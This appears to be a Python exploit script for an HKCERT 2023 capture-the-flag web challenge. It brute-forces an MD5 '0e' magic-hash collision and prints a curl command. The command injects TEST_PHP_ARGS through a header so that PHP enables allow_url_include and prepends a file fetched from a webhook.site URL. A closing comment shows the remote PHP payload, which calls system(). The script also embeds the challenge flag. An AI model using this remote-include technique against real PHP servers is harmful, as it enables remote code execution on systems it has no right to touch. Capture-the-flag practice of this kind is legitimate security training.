import hashlib

curl = 'curl http://localhost:8006/flag.php?url=https://www.php.net/cached.php%%3Ff%%3Dtests/run-tests.php --header "ENV: %s"'
flag = 'hkcert23{th3_wor3t_rickrolld_3v3r...}'
payload = 'TEST_PHP_ARGS=-p /usr/local/bin/php -d allow_url_include=On -d auto_prepend_file=https://webhook.site/b8c29f62-003a-4fbf-a6fe-da70842251e5/?%s /usr/local/lib/php/test/Console_Getopt/tests/001-getopt.phpt'

i = 707995194
while True:
	if(i % 1000000 == 0): print(i)
	out1 = hashlib.md5(flag.encode('utf-8')+(payload%i).encode('utf-8')).hexdigest()
	out2 = out1.split('e')
	if len(out2) == 2:
		if out2[0].isdigit() and int(out2[0]) == 0 and out2[1].isdigit():
			print(payload%i)
			print(curl % (payload % i))
			break
	i += 1

'''
webhook:
<?php system("/proof*");?>
'''